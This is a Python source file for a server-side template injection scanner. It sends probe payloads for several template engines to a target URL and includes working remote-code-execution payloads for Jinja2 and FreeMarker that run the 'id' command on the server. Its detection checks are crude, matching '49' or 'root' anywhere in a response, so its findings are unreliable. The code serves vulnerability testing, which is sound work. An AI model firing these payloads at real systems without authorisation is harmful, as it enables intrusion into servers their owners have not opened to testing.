from typing import Dict, List
import requests
import re

class SSTIScanner:
    def __init__(self):
        self.template_engines = {
            'jinja2': ['{{7*7}}', '{{7*\'7\'}}'],
            'mako': ['${7*7}', '<%= 7*7 %>'],
            'django': ['{{7*7}}', '{% debug %}'],
            'freemarker': ['${7*7}', '<#assign x=7*7>'],
            'velocity': ['#set($x=7*7)$x'],
            'thymeleaf': ['[[${7*7}]]']
        }
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        
        if not parameters:
            parameters = {'input': 'test'}
        
        for param_name in parameters.keys():
            for engine_name, payloads in self.template_engines.items():
                for payload in payloads:
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    response = requests.get(url, params=test_params, timeout=10)
                    
                    detected_engine, details = self._check_ssti(response.text, payload, engine_name)
                    
                    if detected_engine:
                        vulnerabilities.append({
                            'type': f'SSTI - {engine_name.upper()}',
                            'severity': 'Critical',
                            'parameter': param_name,
                            'payload': payload,
                            'description': f'Server-Side Template Injection in {engine_name}',
                            'evidence': details
                        })
        
        return vulnerabilities
    
    def _check_ssti(self, response: str, payload: str, engine: str) -> tuple:
        if engine == 'jinja2':
            if '49' in response or '7777777' in response:
                return True, 'Template expression evaluated'
        
        elif engine == 'mako':
            if '49' in response:
                return True, 'Mako template evaluated'
        
        elif engine == 'freemarker':
            if '49' in response:
                return True, 'FreeMarker template evaluated'
        
        elif engine == 'velocity':
            if '49' in response:
                return True, 'Velocity template evaluated'
        
        return False, None
    
    def test_code_execution(self, url: str, param: str) -> List[Dict]:
        vulnerabilities = []
        
        rce_payloads = {
            'jinja2': "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
            'freemarker': "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        }
        
        for engine, payload in rce_payloads.items():
            try:
                response = requests.get(url, params={param: payload}, timeout=10)
                
                if 'uid=' in response.text or 'root' in response.text:
                    vulnerabilities.append({
                        'type': f'SSTI RCE - {engine.upper()}',
                        'severity': 'Critical',
                        'description': 'Remote Code Execution via SSTI',
                        'evidence': 'Command output detected in response'
                    })
            
            except Exception:
                pass
        
        return vulnerabilities